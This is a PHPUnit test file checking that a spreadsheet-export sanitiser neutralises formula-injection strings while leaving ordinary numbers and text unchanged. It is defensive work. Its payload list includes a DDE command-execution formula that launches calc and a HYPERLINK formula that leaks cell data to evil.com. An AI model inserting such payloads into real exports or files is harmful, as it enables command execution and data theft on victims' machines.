<?php

declare(strict_types=1);

namespace Tests\Unit\Exports;

use App\Exports\Concerns\SanitizesSpreadsheetFormulas;
use PHPUnit\Framework\TestCase;

class SanitizesSpreadsheetFormulasTest extends TestCase
{
    private object $consumer;

    protected function setUp(): void
    {
        parent::setUp();

        $this->consumer = new class
        {
            use SanitizesSpreadsheetFormulas;

            public function callSanitizeFormula(?string $value): ?string
            {
                return $this->sanitizeFormula($value);
            }

            /**
             * @param  array<mixed>  $row
             * @return array<mixed>
             */
            public function callSanitizeRow(array $row): array
            {
                return $this->sanitizeRow($row);
            }
        };
    }

    /**
     * BE-SEC-03: Formula injection payloads are neutralized by prepending a single quote (').
     */
    public function test_neutralizes_dangerous_formula_payloads(): void
    {
        $payloads = [
            "=cmd|'/C calc'!A0",
            '+SUM(1,1)',
            '@SUM(A1)',
            '-2+3',
            '=HYPERLINK("http://evil.com?leak="&A1, "Click")',
            "\tTAB_INJECTION",
            "\rCARRIAGE_RETURN",
        ];

        foreach ($payloads as $payload) {
            $sanitized = $this->consumer->callSanitizeFormula($payload);
            $this->assertStringStartsWith("'", $sanitized, "Payload [{$payload}] must be prefixed with a single quote");
            $this->assertSame("'".$payload, $sanitized);
        }
    }

    /**
     * BE-SEC-03: Authentic numeric values (including negative numbers and decimals) remain untouched.
     */
    public function test_preserves_legitimate_numeric_and_text_values(): void
    {
        $safeValues = [
            '0',
            '1000',
            '-15000',
            '-12.50',
            '50000.00',
            'Kopi Susu Gula Aren',
            'INV/2026/11/001',
            'Normal notes from user',
            '',
            null,
        ];

        foreach ($safeValues as $value) {
            $sanitized = $this->consumer->callSanitizeFormula($value);
            $this->assertSame($value, $sanitized, "Legitimate value [{$value}] must not be modified");
        }
    }

    /**
     * BE-SEC-03: sanitizeRow cleanses complex multi-column row arrays.
     */
    public function test_sanitizes_entire_row_array(): void
    {
        $row = [
            'id' => 101,
            'code' => 'ORD-001',
            'customer_name' => "=cmd|'/C calc'!A0",
            'notes' => '+SUM(1,1)',
            'amount' => '-15000.00',
            'reference' => '@EXTERNAL_LEAK',
            'nested' => [
                'tag' => '-2+3',
                'safe' => 'Apeiron POS',
            ],
        ];

        $cleaned = $this->consumer->callSanitizeRow($row);

        $this->assertSame(101, $cleaned['id']);
        $this->assertSame('ORD-001', $cleaned['code']);
        $this->assertSame("'=cmd|'/C calc'!A0", $cleaned['customer_name']);
        $this->assertSame("'+SUM(1,1)", $cleaned['notes']);
        $this->assertSame('-15000.00', $cleaned['amount'], 'Numeric amount must not be prefixed');
        $this->assertSame("'@EXTERNAL_LEAK", $cleaned['reference']);
        $this->assertSame("'-2+3", $cleaned['nested']['tag']);
        $this->assertSame('Apeiron POS', $cleaned['nested']['safe']);
    }
}
